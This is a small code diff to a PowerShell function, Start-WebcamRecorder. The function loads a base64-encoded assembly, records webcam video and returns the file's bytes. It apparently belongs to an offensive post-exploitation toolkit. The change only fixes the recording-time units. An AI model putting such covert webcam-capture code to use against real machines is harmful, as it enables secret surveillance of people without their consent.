@@ -24,7 +24,7 @@ function Start-WebcamRecorder
   }
   if (-not $PSBoundParameters['RecordTime']) 
   {
-    $RecordTime = 0.5
+    $RecordTime = 100
   }
   #Convert the base64 encoded assembly to raw bytes.
   $bytes = [Convert]::FromBase64String($encMergedAssembly)
@@ -58,7 +58,7 @@ function Start-WebcamRecorder
     try{$VideoCapture.Start()}
     catch{Write-Verbose "[!]Unable to start capture"; $VideoCapture.Stop();break}
     Write-Verbose "[+] Starting Webcam video capture"
-    Start-Sleep -seconds $RecordTime
+    Start-Sleep -Milliseconds $RecordTime
     $VideoCapture.stop()
     Write-Verbose "[+] Webcam video capture completed"
     $returnBytes = [System.IO.File]::ReadAllBytes($OutPath)
